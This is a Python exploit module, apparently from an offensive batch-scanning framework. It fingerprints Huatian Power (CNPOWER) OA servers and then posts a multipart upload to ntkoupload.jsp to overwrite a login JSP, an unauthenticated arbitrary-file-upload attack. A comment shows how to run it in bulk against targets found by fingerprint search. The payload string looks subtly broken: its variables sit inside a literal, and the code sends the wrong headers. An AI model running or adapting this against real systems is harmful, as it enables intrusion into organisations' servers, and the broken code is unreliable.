# coding=utf-8
# @Author   : zpchcbd HG team
# @Blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2022-08-02 9:41

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# "body=\"/OAapp/WebObjects/OAapp.woa\" || body=\"/OAapp/htpages/app\"",
# python3 batch.py -m exploit.scripts.OA.CNPOWER.unauth_uploadfile -cs -fs "body=\"/OAapp/WebObjects/OAapp.woa\""


class Script(BaseScript):
    name = 'CNPOWER OA'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp']
        # priority
        self.priority = 1
        # 相关信息
        self.info = '''华天动力 OA 任意文件上传漏洞 大连华天软件有限公司开发的协同办公软件'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and '/OAapp/WebObjects/OAapp.woa' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = '------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name=\"EDITFILE\"; filename=\"xxx.txt\"\r\nContent-Type: image/png\r\n\r\n" + fileContent + "\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name=\"newFileName\"\r\n\r\n" + path + "Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm--\r\n'
                text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=self.headers, timeout=self.req_timeout)
                if text is not None and '.dat' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} htmlofficeservlet'.format(self.name), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
    # sem = asyncio.Semaphore(500)
    # sc = Script('192.168.4.137:8161', 1, sem)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack())
